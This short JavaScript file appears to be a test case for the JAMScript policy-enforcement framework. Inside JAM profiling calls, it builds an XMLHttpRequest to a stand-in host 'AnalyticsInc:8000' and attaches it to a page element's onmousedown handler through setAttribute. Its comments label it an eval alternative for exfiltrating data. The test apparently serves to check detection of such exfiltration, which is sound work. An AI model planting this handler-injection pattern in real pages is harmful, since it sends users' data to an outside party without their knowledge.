
JAM.startProfile('load');
introspect(JAMScript.introspectors.processAll) {
// setAttribute - Eval Alternative - No Obfuscation
// Exfiltrate data using XMLHTTP request
var exp='xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=onmousedown1", true);xmlhttp.send(null);';
document.getElementById('test').setAttribute("onmousedown",exp);

}

JAM.stopProfile('load');
